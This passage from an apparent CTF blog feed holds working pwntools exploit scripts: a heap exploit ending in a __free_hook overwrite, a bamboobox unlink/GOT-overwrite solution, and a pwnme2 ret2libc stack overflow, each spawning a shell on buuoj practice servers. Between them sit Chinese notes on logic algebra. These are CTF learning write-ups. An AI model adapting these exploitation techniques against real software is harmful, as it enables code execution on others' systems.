class="string">b&#x27;choice&gt;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;marking testing papers.....\n&#x27;</span>)</span><br><span class="line">sid = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">s = io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">if</span> s == <span class="string">b&#x27;finish&#x27;</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">elif</span> <span class="string">b&#x27;score&#x27;</span> <span class="keyword">in</span> s:</span><br><span class="line">sid = s[<span class="number">14</span>] - <span class="number">0x30</span></span><br><span class="line">scores[sid] = <span class="built_in">int</span>(s[<span class="number">29</span>:].decode(), <span class="number">10</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">scores[sid] -= <span class="number">10</span></span><br><span class="line"><span class="keyword">if</span> scores[sid] &lt; <span class="number">0</span>:</span><br><span class="line">scores[sid] += <span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_review</span>(<span class="params">sid, size, comment, <span class="built_in">bytes</span>=<span class="literal">False</span>, enter=<span class="literal">True</span></span>):</span><br><span class="line"><span class="keyword">assert</span>(current_role == <span class="number">0</span> <span class="keyword">and</span> students[sid] == <span class="number">1</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;choice&gt;&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;which one? &gt; &#x27;</span>, <span class="built_in">str</span>(sid).encode())</span><br><span class="line"><span class="keyword">if</span> reviews[sid] <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;please input the size of comment: &#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line"><span class="keyword">if</span> enter:</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">bytes</span>:</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;enter your comment:&#x27;</span>, comment.encode())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;enter your comment:&#x27;</span>, comment)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">bytes</span>:</span><br><span class="line">io.sendafter(<span class="string">b&#x27;enter your comment:&#x27;</span>, comment.encode())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io.sendafter(<span class="string">b&#x27;enter your comment:&#x27;</span>, comment)</span><br><span class="line">reviews[sid] = comment</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">call_parent</span>(<span class="params">sid</span>):</span><br><span class="line"><span class="keyword">global</span> student_num</span><br><span class="line"><span class="keyword">assert</span>(current_role == <span class="number">0</span> <span class="keyword">and</span> students[sid] == <span class="number">1</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;choice&gt;&gt; &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;which student id to choose?&#x27;</span>, <span class="built_in">str</span>(sid).encode())</span><br><span class="line">students[sid] = <span class="number">2</span></span><br><span class="line">reviews[sid] = <span class="literal">None</span></span><br><span class="line">student_num -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_role</span>(<span class="params">role</span>):</span><br><span class="line"><span class="keyword">global</span> current_role</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;choice&gt;&gt; &#x27;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;role: &lt;0.teacher/1.student&gt;: &#x27;</span>, <span class="built_in">str</span>(role).encode())</span><br><span class="line">current_role = role</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_review</span>(<span class="params">address, offset=<span class="literal">True</span></span>):</span><br><span class="line"><span class="keyword">assert</span>(current_role == <span class="number">1</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;choice&gt;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> io.recv(<span class="number">4</span>) == <span class="string">b&#x27;Good&#x27;</span>:</span><br><span class="line">c = chunk_addr[current_sid] = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;add&#x27;</span>, drop=<span class="literal">True</span>)[-<span class="number">13</span>:].decode(), <span class="number">16</span>)</span><br><span class="line">chunk_addr[current_sid] -= <span class="number">0x10</span><span class="comment"># get the address of chunk head instead of writable head</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;wherever you want! addr: &#x27;</span>, <span class="built_in">str</span>((c + address) * <span class="number">10</span>).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pray</span>():</span><br><span class="line"><span class="keyword">assert</span>(current_role == <span class="number">1</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;choice&gt;&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_sid</span>(<span class="params">sid</span>):</span><br><span class="line"><span class="keyword">global</span> current_sid</span><br><span class="line"><span class="keyword">assert</span>(current_role == <span class="number">1</span> <span class="keyword">and</span> students[sid] != <span class="number">0</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;choice&gt;&gt; &#x27;</span>, <span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;input your id: &#x27;</span>, <span class="built_in">str</span>(sid).encode())</span><br><span class="line">current_sid = sid</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_status</span>():</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;students: &#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(students)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;reviews: &#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(reviews)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;chunk_addr: &#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(chunk_addr)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;scores: &#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(scores)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;current_role: &#x27;</span> + <span class="built_in">str</span>(current_role))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;role: &lt;0.teacher/1.student&gt;: &#x27;</span>, <span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">add_student(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">change_role(<span class="number">0</span>)</span><br><span class="line">write_review(<span class="number">5</span>, <span class="number">0xF0</span>, <span class="string">&#x27;deadbeef&#x27;</span>)</span><br><span class="line">write_review(<span class="number">6</span>, <span class="number">1024</span>-<span class="number">16</span>, <span class="string">&#x27;deadbeef&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### Step 1: construct a fake chunk to bypass the check for free() of student 6</span></span><br><span class="line">write_review(<span class="number">4</span>, <span class="number">0x200</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0xF0</span> + p64(<span class="number">0x500</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>), <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### Step 2: give student 4 reward to change the chunk address of student 5 to that of student 6</span></span><br><span class="line">change_role(<span class="number">1</span>)</span><br><span class="line">change_sid(<span class="number">4</span>)</span><br><span class="line">pray()</span><br><span class="line"></span><br><span class="line">change_role(<span class="number">0</span>)</span><br><span class="line">give_score()<span class="comment"># int overflow</span></span><br><span class="line"></span><br><span class="line">change_role(<span class="number">1</span>)</span><br><span class="line">change_sid(<span class="number">4</span>)</span><br><span class="line">check_review(<span class="number">0x39</span> + <span class="number">0x50</span>)</span><br><span class="line">chunk_addr[<span class="number">4</span>] += <span class="number">0x200</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### Step 3: give student 6 reward to change the chunk size of student 6 to 0x100 more</span></span><br><span class="line">change_role(<span class="number">1</span>)</span><br><span class="line">change_sid(<span class="number">6</span>)</span><br><span class="line">pray()</span><br><span class="line"></span><br><span class="line">change_role(<span class="number">0</span>)</span><br><span class="line">give_score()<span class="comment"># int overflow</span></span><br><span class="line"></span><br><span class="line">change_role(<span class="number">1</span>)</span><br><span class="line">change_sid(<span class="number">6</span>)</span><br><span class="line">check_review(<span class="number">0x48</span> + <span class="number">0x100</span> + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### Step 4: delete student 6 to free the chunk with fake size: 0x500</span></span><br><span class="line">change_role(<span class="number">0</span>)</span><br><span class="line">call_parent(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### Step 5: read the comment of student 5 to get and calculate the libc address</span></span><br><span class="line">change_role(<span class="number">1</span>)</span><br><span class="line">change_sid(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;choice&gt;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;here is the review:\n&#x27;</span>)</span><br><span class="line">main_arena = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>) - <span class="number">96</span></span><br><span class="line">libc_base = main_arena - (libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] + <span class="number">0x10</span>)</span><br><span class="line">sys_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]<span class="comment"># system address got</span></span><br><span class="line">malloc_hook = libc_base + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">### Step 6: get student 6 back, now the pointer of student 6 should be in the chunk of student 5</span></span><br><span class="line">change_role(<span class="number">0</span>)</span><br><span class="line">add_student(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### Step 7: write comment for student 6: &#x27;/bin/sh&#x27;</span></span><br><span class="line">write_review(<span class="number">6</span>, <span class="number">10</span>, <span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### Step 8: change the address of student 6 to write system address to __free_hook</span></span><br><span class="line">stu6_writeaddr = chunk_addr[<span class="number">4</span>] + <span class="number">0x50</span><span class="comment"># address of student 6 to write to</span></span><br><span class="line"></span><br><span class="line">payload = p64(chunk_addr[<span class="number">4</span>] + <span class="number">0x30</span>)<span class="comment"># address of student 6 header chunk</span></span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">4</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)<span class="comment"># size of student 6 header chunk</span></span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(free_hook)<span class="comment"># change the write address of student 6 to __free_hook</span></span><br><span class="line">write_review(<span class="number">5</span>, <span class="number">0</span>, payload, <span class="built_in">bytes</span>=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### Step 9: write system address to __free_hook</span></span><br><span class="line">write_review(<span class="number">6</span>, <span class="number">0</span>, p64(sys_addr), <span class="built_in">bytes</span>=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### Step 10: change the address of student 6 back to buffer string &#x27;/bin/sh&#x27;</span></span><br><span class="line">payload = p64(chunk_addr[<span class="number">4</span>] + <span class="number">0x30</span>)<span class="comment"># address of student 6 header chunk</span></span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">4</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)<span class="comment"># size of student 6 header chunk</span></span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(stu6_writeaddr)</span><br><span class="line">write_review(<span class="number">5</span>, <span class="number">0</span>, payload, <span class="built_in">bytes</span>=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### Step 11: delete student 6, getshell</span></span><br><span class="line">change_role(<span class="number">0</span>)</span><br><span class="line">call_parent(<span class="number">6</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>数字逻辑 Chapter 2——逻辑代数基础</title>
      <link href="/2023/02/28/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91-Chapter-2%E2%80%94%E2%80%94%E9%80%BB%E8%BE%91%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/02/28/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91-Chapter-2%E2%80%94%E2%80%94%E9%80%BB%E8%BE%91%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="2-1-逻辑代数基本概念"><a href="#2-1-逻辑代数基本概念" class="headerlink" title="2.1 逻辑代数基本概念"></a>2.1 逻辑代数基本概念</h1><h2 id="2-1-1-逻辑变量及基本逻辑运算"><a href="#2-1-1-逻辑变量及基本逻辑运算" class="headerlink" title="2.1.1 逻辑变量及基本逻辑运算"></a>2.1.1 逻辑变量及基本逻辑运算</h2><p>一、逻辑变量<br>任何逻辑变量仅有两种可能取值：0或1<br>二、基本逻辑运算：与或非</p><h2 id="2-1-2-逻辑函数表示形式"><a href="#2-1-2-逻辑函数表示形式" class="headerlink" title="2.1.2 逻辑函数表示形式"></a>2.1.2 逻辑函数表示形式</h2><ol><li>逻辑函数表达式</li><li>真值表</li><li>卡诺图</li></ol><h1 id="2-2-逻辑代数公理、基本定理与规则"><a href="#2-2-逻辑代数公理、基本定理与规则" class="headerlink" title="2.2 逻辑代数公理、基本定理与规则"></a>2.2 逻辑代数公理、基本定理与规则</h1><h2 id="2-2-1-公理："><a href="#2-2-1-公理：" class="headerlink" title="2.2.1 公理："></a>2.2.1 公理：</h2><ol><li>交换律</li><li>结合律</li><li>分配律</li><li>0-1律</li><li>互补律</li></ol><h2 id="2-2-2-基本定理："><a href="#2-2-2-基本定理：" class="headerlink" title="2.2.2 基本定理："></a>2.2.2 基本定理：</h2><ol><li>0与1的与或关系</li><li>$A+A&#x3D;A,A\cdot A&#x3D;A$</li><li>吸收律：$A\cdot(A+B)&#x3D;A,A+A\cdot B&#x3D;A$</li><li>$A+\bar A\cdot B&#x3D;A+B,A\cdot(\bar A+B)&#x3D;AB$</li><li>$\overline {\overline A}&#x3D;A$</li><li>德摩根律</li><li>$A\cdot B+A\cdot \bar B&#x3D;A,(A+B)\cdot(A+\bar B)&#x3D;A$</li><li>$A\cdot B+\bar A\cdot C+B\cdot C&#x3D;A\cdot B+\bar A\cdot C,(A+B)\cdot(\bar A+C)\cdot(B+C)&#x3D;(A+B)\cdot(\bar A+C)$</li></ol><h2 id="2-2-3-重要规则"><a href="#2-2-3-重要规则" class="headerlink" title="2.2.3 重要规则"></a>2.2.3 重要规则</h2><ol><li>代入规则</li><li>反演规则</li><li>对偶规则</li></ol><h2 id="2-2-4-复合逻辑"><a href="#2-2-4-复合逻辑" class="headerlink" title="2.2.4 复合逻辑"></a>2.2.4 复合逻辑</h2><ol><li>与非逻辑：先与后非</li><li>或非逻辑：先或后非</li><li>与或非逻辑：先与再或后非</li><li>异或、同或</li></ol><h1 id="2-3-逻辑函数表达式两种基本形式"><a href="#2-3-逻辑函数表达式两种基本形式" class="headerlink" title="2.3 逻辑函数表达式两种基本形式"></a>2.3 逻辑函数表达式两种基本形式</h1><h2 id="2-3-1-两种基本形式"><a href="#2-3-1-两种基本形式" class="headerlink" title="2.3.1 两种基本形式"></a>2.3.1 两种基本形式</h2><p>与-或表达式（先与后或）、或-与表达式（先或后与）</p><h2 id="2-3-2-标准形式"><a href="#2-3-2-标准形式" class="headerlink" title="2.3.2 标准形式"></a>2.3.2 标准形式</h2><ol><li>标准与-或表达式：由一系列最小项或构成的逻辑表达式，也称为最小项表达式。<br>最小项：如果一个具有n个变量的函数的与项包含全部n个变量，每一个变量都以原变量或反变量的形式出现且仅出现1次，则该与项称为最小项。<br><strong>使用m<del>i</del>表示最小项，下标取值规则：按照变量顺序将原变量以1表示，反变量以0表示得到的二进制数。</strong><br>最小项性质：<br>(1) 任意一个最小项相应变量有且仅有一种取值使其值为1<br>(2) 相同变量构成的最小项相与均为0<br>(3) 所有最小项相或为1<br>(4) n个变量构成的最小项有n个相邻最小项（仅有一个变量的原反形式不同）。</li><li>标准或-与表达式：由一系列最大项与构成的逻辑表达式，也称为最大项表达式。<br>最大项：如果一个具有n个变量的函数的或项包含全部n个变量，每一个变量都以原变量或反变量的形式出现且仅出现1次，则该或项称为最大项。<br><strong>使用M<del>i</del>表示最大项，下标取值规则与最小项相反：按照变量顺序将原变量以0表示，反变量以1表示得到的二进制数。</strong><br>最大项性质：<br>(1) 任意一个最大项相应变量有且仅有一种取值使其值为0<br>(2) 相同变量构成的最大项相或均为1<br>(3) 所有最大项相与为0<br>(4) n个变量构成的最大项有n个相邻最大项（仅有一个变量的原反形式不同）。</li></ol><p>最小项与最大项的关系：$\overline {m_i}&#x3D;M_i$</p><h2 id="2-3-3-任意逻辑函数表达式转换为标准表达式"><a href="#2-3-3-任意逻辑函数表达式转换为标准表达式" class="headerlink" title="2.3.3 任意逻辑函数表达式转换为标准表达式"></a>2.3.3 任意逻辑函数表达式转换为标准表达式</h2><p>代数转换法、真值表转换法</p><ol><li>代数转换法：先转换后扩展</li><li>真值表转换法：列表直接写</li></ol><h1 id="2-4-逻辑函数化简"><a href="#2-4-逻辑函数化简" class="headerlink" title="2.4 逻辑函数化简"></a>2.4 逻辑函数化简</h1><h2 id="2-4-1-代数化简"><a href="#2-4-1-代数化简" class="headerlink" title="2.4.1 代数化简"></a>2.4.1 代数化简</h2><p>没有固定步骤可以遵循。<br>最简与或表达式条件：</p><ol><li>表达式中与项最少</li><li>每一个与项的变量个数最少<br>与或表达式化简常用方法：并项、吸收、消去、配项<br>或与表达式化简常用方法：两次对偶法（或与对偶成与或，化简与或后对偶成最简或与）</li></ol><h2 id="2-4-2-卡诺图化简"><a href="#2-4-2-卡诺图化简" class="headerlink" title="2.4.2 卡诺图化简"></a>2.4.2 卡诺图化简</h2><p>可从图形上直观找出相邻最小项合并（使用卡诺圈）<br>求逻辑函数最简与或表达式的一般步骤：</p><ul><li>画出函数卡诺图</li><li>圈出函数的全部质蕴含项</li><li>找出所有必要质蕴含项</li><li>求最简质蕴含项集</li></ul><p>（质蕴含项：不是其他与项子集的与项）<br>卡诺图化简原则：</p><ol><li>覆盖函数中所有最小项的前提下，卡诺圈的个数应达到最少</li><li>满足合并规律的前提下卡诺圈达到最大</li><li>根据合并需要，每个最小项可以被多个卡诺圈包围。</li></ol><p>求最简或与表达式一般步骤：</p><ul><li>做出卡诺图，求出反函数的最简与或表达式（0格）</li><li>对反函数的最简与或表达式取反即得到原函数的最简或与表达式</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-pwn write-ups (10)</title>
      <link href="/2023/02/28/buuctf-pwn-write-ups-10/"/>
      <url>/2023/02/28/buuctf-pwn-write-ups-10/</url>
      
        <content type="html"><![CDATA[<p>@[toc]</p><h1 id="buu073-hitcontraining-bamboobox"><a href="#buu073-hitcontraining-bamboobox" class="headerlink" title="buu073-hitcontraining_bamboobox"></a>buu073-hitcontraining_bamboobox</h1><p>数据结构：<br><img src="https://img-blog.csdnimg.cn/d99f16a105794f47aec93a1ea9a3db5f.png"><br>共可申请100个结构，其中change_item函数有任意长度堆溢出漏洞。<br><img src="https://img-blog.csdnimg.cn/72907531dc174ac0a71c3acee836b772.png" alt="在这里插入图片描述"><br>本题程序加载地址固定，itemlist地址固定，因此考虑使用unlink方法解题。<br><img src="https://img-blog.csdnimg.cn/d858dce877a145c588d755fa3719a302.png" alt="在这里插入图片描述"><br>unlink之后可以直接通过第一个chunk读取到stdin的地址，从而获取libc加载基址。<br>需要注意的是这里修改的是atoi函数的got表地址，如果修改free函数的got表地址，由于输入时程序会将输入的后面一个字节清零，会导致free函数got表后面的一个地址（puts）发生错误，使得menu函数调用puts函数失败。而atoi后面是exit函数地址，无关紧要。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29731</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">length, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Please enter the length of item name:&#x27;</span>, <span class="built_in">str</span>(length).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;Please enter the name of item:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">index, length, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Please enter the index of item:&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Please enter the length of item name:&#x27;</span>, <span class="built_in">str</span>(length).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;Please enter the new name of the item:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Please enter the index of item:&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x88</span>, <span class="string">b&#x27;colin&#x27;</span>)     <span class="comment"># chunk #0</span></span><br><span class="line">add(<span class="number">0x88</span>, <span class="string">b&#x27;colin&#x27;</span>)     <span class="comment"># chunk #1</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>)   <span class="comment"># chunk #2</span></span><br><span class="line">payload = p64(<span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0x81</span>)</span><br><span class="line">payload += p64(<span class="number">0x6020C8</span> - <span class="number">0x18</span>)</span><br><span class="line">payload += p64(<span class="number">0x6020C8</span> - <span class="number">0x10</span>)</span><br><span class="line">payload += cyclic(<span class="number">0x60</span>)</span><br><span class="line">payload += p64(<span class="number">0x80</span>)</span><br><span class="line">payload += p64(<span class="number">0x90</span>)</span><br><span class="line">change(<span class="number">0</span>, <span class="number">0x90</span>, payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show()</span><br><span class="line">io.recv(<span class="number">4</span>)</span><br><span class="line">stdin = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stdin))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>, stdin)</span><br><span class="line">base = stdin - libc.dump(<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>)</span><br><span class="line">sys = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">change(<span class="number">0</span>, <span class="number">0x20</span>, p64(stdin) + p64(<span class="number">0</span>) + p64(<span class="number">0x88</span>) + p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>]))</span><br><span class="line">change(<span class="number">0</span>, <span class="number">0x8</span>, p64(sys))</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu074-cmcc-pwnme2"><a href="#buu074-cmcc-pwnme2" class="headerlink" title="buu074-cmcc_pwnme2"></a>buu074-cmcc_pwnme2</h1><p>简单的栈溢出，题目给的拼接字符串的函数里面的路径是错的，不需要用，直接输出got表然后get shell即可。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&quot;./pwnme2&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">29174</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwnme2&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x70</span>)</span><br><span class="line">payload += p32(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p32(elf.symbols[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">payload += p32(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Please input:&#x27;</span>, payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Hello&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">puts = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts)</span><br><span class="line">base = puts - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x70</span>)</span><br><span class="line">payload += p32(system)</span><br><span class="line">payload += p32(elf.symbols[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">payload += p32(binsh)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Please input:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu075-picoctf-2018-got-shell"><a href="#buu075-picoctf-2018-got-shell" class="headerlink" 